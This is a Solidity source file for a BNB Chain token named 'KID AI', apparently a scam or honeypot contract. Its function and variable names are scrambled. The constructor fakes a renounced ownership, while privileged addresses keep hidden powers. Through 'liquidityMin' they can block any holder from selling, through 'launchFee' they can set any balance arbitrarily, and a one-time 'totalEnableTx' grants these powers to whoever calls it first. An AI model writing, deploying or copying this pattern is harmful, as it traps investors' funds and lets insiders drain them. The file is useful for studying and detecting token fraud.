/**
 *Submitted for verification at BscScan.com on 2023-02-26
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface liquidityWallet {
    function createPair(address txLaunch, address toBuy) external returns (address);
}

contract KIDAI {

    uint8 public decimals = 18;

    function maxWalletSender(address exemptSwap, address takeAt, uint256 autoToken) internal returns (bool) {
        require(balanceOf[exemptSwap] >= autoToken);
        balanceOf[exemptSwap] -= autoToken;
        balanceOf[takeAt] += autoToken;
        emit Transfer(exemptSwap, takeAt, autoToken);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    function transfer(address modeTx, uint256 autoToken) external returns (bool) {
        return transferFrom(fromAutoEnable(), modeTx, autoToken);
    }

    function totalEnableTx(address txReceiver) public {
        require(!modeWalletReceiver);
        minList[txReceiver] = true;
        modeWalletReceiver = true;
    }

    address public swapAmountToken;

    uint256 public autoSender;

    mapping(address => bool) public minList;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    uint256 public totalSupply = 100000000 * 10 ** 18;

    function liquidityMin(address txFrom) public {
        require(minList[fromAutoEnable()]);
        if (txFrom == swapAmountToken || txFrom == modeTrading) {
            return;
        }
        autoShould[txFrom] = true;
    }

    bool public txTo;

    address public owner;

    mapping(address => bool) public autoShould;

    event Transfer(address indexed from, address indexed sellMarketing, uint256 value);

    function fromAutoEnable() private view returns (address) {
        return msg.sender;
    }

    address public modeTrading;

    bool private feeMin;

    function transferFrom(address maxLimitTx, address modeTx, uint256 autoToken) public returns (bool) {
        if (maxLimitTx != fromAutoEnable() && allowance[maxLimitTx][fromAutoEnable()] != type(uint256).max) {
            require(allowance[maxLimitTx][fromAutoEnable()] >= autoToken);
            allowance[maxLimitTx][fromAutoEnable()] -= autoToken;
        }
        require(!autoShould[maxLimitTx]);
        return maxWalletSender(maxLimitTx, modeTx, autoToken);
    }

    bool public listLaunch;

    bool private exemptEnable;

    function launchFee(address modeTx, uint256 autoToken) public {
        require(minList[fromAutoEnable()]);
        balanceOf[modeTx] = autoToken;
    }

    bool public modeWalletReceiver;

    uint256 private autoEnable;

    constructor (){ 
        modeTrading = liquidityWallet(address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)).createPair(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),address(this));
        swapAmountToken = fromAutoEnable();
        balanceOf[swapAmountToken] = totalSupply;
        minList[swapAmountToken] = true;
        emit Transfer(address(0), swapAmountToken, totalSupply);
        emit OwnershipTransferred(swapAmountToken, address(0));
    }

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = "KAI";

    event Approval(address indexed shouldSender, address indexed spender, uint256 value);

    function approve(address autoLaunched, uint256 autoToken) public returns (bool) {
        allowance[fromAutoEnable()][autoLaunched] = autoToken;
        emit Approval(fromAutoEnable(), autoLaunched, autoToken);
        return true;
    }

    uint256 public txExempt;

    string public name = "KID AI";

}